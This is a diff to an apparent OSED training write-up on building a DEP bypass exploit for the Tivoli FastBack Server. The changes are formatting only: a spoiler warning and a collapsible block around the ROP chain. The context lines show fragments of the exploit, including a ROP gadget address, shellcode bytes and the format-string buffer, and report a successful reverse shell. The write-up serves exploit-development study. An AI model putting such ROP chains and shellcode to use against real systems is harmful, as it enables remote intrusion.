@@ -10,7 +10,11 @@ tags:
   - Insecure code
 ---
 
-In the below writeup, we continue building a DEP bypass for the Tivolti Fastback Server. The write-up focuses purely on the DEP bypass, as we’ve already created an exploit and will continue building on it.
+In this writeup, we continue building a DEP bypass for the Tivolti Fastback Server. 
+The write-up focuses purely on the DEP bypass, as we’ve already created an exploit and will continue building on it.
+
+**WARNING: OSED EXERCISE SPOILERS BELOW.**
+
 <!--more-->
 
 ## Table of contents
@@ -1752,8 +1756,12 @@ We run our payload and successfully obtain a reverse shell. In the next write-up
 
 ![Untitled](/assets/Untitled%205.png)
 
-Our full ROP chain looks as follows:
-
+Our full ROP chain looks as follows, use dropdown to view.
+<details>
+  <summary>Large Code Block</summary>
+  
+ 
+  
 ```python
 eip = pack("<L", (0x100113dd)) # push esp ; sub eax, 0x20 ; pop ebx ; ret  ;
 
@@ -1945,3 +1953,4 @@ shellcode += b"\x33\x81\x58\x9b\xd3"
 formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset + va + eip + rop + shellcode ,0,0,0,0)
 buf += formatString
 ```
+</details>
